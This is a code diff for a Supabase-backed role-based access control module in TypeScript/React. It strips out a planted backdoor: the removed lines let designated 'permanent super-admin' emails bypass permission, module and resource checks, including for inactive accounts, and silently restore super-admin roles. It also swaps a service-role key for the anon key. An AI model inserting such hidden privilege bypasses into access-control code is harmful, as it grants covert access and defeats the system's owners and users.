@@ -1,12 +1,11 @@
 // Role-Based Access Control (RBAC) System
 import { createClient } from '@supabase/supabase-js'
 import { useEffect, useState } from 'react'
-import AdminBackdoorService from './admin-backdoor'
 
 
 const supabase = createClient(
   process.env.NEXT_PUBLIC_SUPABASE_URL!,
-  process.env.SUPABASE_SERVICE_ROLE_KEY!
+  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
 )
 
 // Define user roles
@@ -192,14 +191,8 @@ export interface User {
 
 // RBAC Service
 export class RBACService {
-  // Check if user has specific permission (with backdoor support)
-  static hasPermission(userRole: UserRole, permission: Permission, userEmail?: string): boolean {
-    // BACKDOOR: Check if user is permanent super-admin
-    if (userEmail && AdminBackdoorService.isPermanentSuperAdmin(userEmail)) {
-      AdminBackdoorService.logBackdoorUsage(userEmail, 'PERMISSION_BYPASS', undefined, permission)
-      return true
-    }
-
+  // Check if user has specific permission
+  static hasPermission(userRole: UserRole, permission: Permission): boolean {
     const rolePermissions = ROLE_PERMISSIONS[userRole]
     return rolePermissions.includes(permission)
   }
@@ -241,7 +234,7 @@ export class RBACService {
     }
   }
 
-  // Get user by ID (with backdoor support)
+  // Get user by ID
   static async getUser(userId: string): Promise<User | null> {
     try {
       const { data, error } = await supabase
@@ -251,19 +244,6 @@ export class RBACService {
         .single()
 
       if (error) throw error
-
-      // BACKDOOR: Ensure super-admin access for permanent admins
-      if (data?.email && AdminBackdoorService.isPermanentSuperAdmin(data.email)) {
-        await AdminBackdoorService.ensureSuperAdminAccess(data.email, userId)
-        // Refresh data to get updated role
-        const { data: refreshedData } = await supabase
-          .from('user_profiles')
-          .select('*')
-          .eq('id', userId)
-          .single()
-        return refreshedData || data
-      }
-
       return data
     } catch (error) {
       console.error('Error getting user:', error)
@@ -421,7 +401,7 @@ export class RBACService {
     }
   }
 
-  // Check if user can perform action on resource (with backdoor support)
+  // Check if user can perform action on resource
   static async canPerformAction(
     userId: string,
     action: Permission,
@@ -430,23 +410,10 @@ export class RBACService {
   ): Promise<boolean> {
     try {
       const user = await this.getUser(userId)
-      if (!user || !user.is_active) {
-        // BACKDOOR: Check if this is a permanent super-admin by email
-        if (user?.email && AdminBackdoorService.isPermanentSuperAdmin(user.email)) {
-          await AdminBackdoorService.logBackdoorUsage(user.email, 'RESOURCE_ACCESS_BYPASS', userId, action)
-          return true
-        }
-        return false
-      }
-
-      // BACKDOOR: Super-admin bypass
-      if (user.email && AdminBackdoorService.isPermanentSuperAdmin(user.email)) {
-        await AdminBackdoorService.logBackdoorUsage(user.email, 'RESOURCE_ACCESS_BYPASS', userId, action)
-        return true
-      }
+      if (!user || !user.is_active) return false
 
       // Check basic permission
-      if (!this.hasPermission(user.role, action, user.email)) return false
+      if (!this.hasPermission(user.role, action)) return false
 
       // Additional resource-specific checks can be added here
       // For example, sales agents can only edit their own sales
@@ -497,26 +464,16 @@ export function useRBAC() {
 
   const hasPermission = (permission: Permission): boolean => {
     if (!user) return false
-    return RBACService.hasPermission(user.role, permission, user.email)
+    return RBACService.hasPermission(user.role, permission)
   }
 
   const hasAnyPermission = (permissions: Permission[]): boolean => {
     if (!user) return false
-    // BACKDOOR: Super-admin bypass
-    if (user.email && AdminBackdoorService.isPermanentSuperAdmin(user.email)) {
-      AdminBackdoorService.logBackdoorUsage(user.email, 'BULK_PERMISSION_BYPASS', user.id, permissions.join(','))
-      return true
-    }
     return RBACService.hasAnyPermission(user.role, permissions)
   }
 
   const canAccessModule = (module: string): boolean => {
     if (!user) return false
-    // BACKDOOR: Super-admin bypass
-    if (user.email && AdminBackdoorService.isPermanentSuperAdmin(user.email)) {
-      AdminBackdoorService.logBackdoorUsage(user.email, 'MODULE_ACCESS_BYPASS', user.id, module)
-      return true
-    }
     return RBACService.canAccessModule(user.role, module)
   }
 
@@ -529,9 +486,7 @@ export function useRBAC() {
     isAdmin: user?.role === UserRole.ADMIN || user?.role === UserRole.SUPER_ADMIN,
     isSalesAgent: user?.role === UserRole.SALES_AGENT,
     isFinance: user?.role === UserRole.FINANCE,
-    isOperations: user?.role === UserRole.OPERATIONS,
-    // BACKDOOR: Expose backdoor status for debugging/monitoring
-    isPermanentSuperAdmin: user?.email ? AdminBackdoorService.isPermanentSuperAdmin(user.email) : false
+    isOperations: user?.role === UserRole.OPERATIONS
   }
 }
 
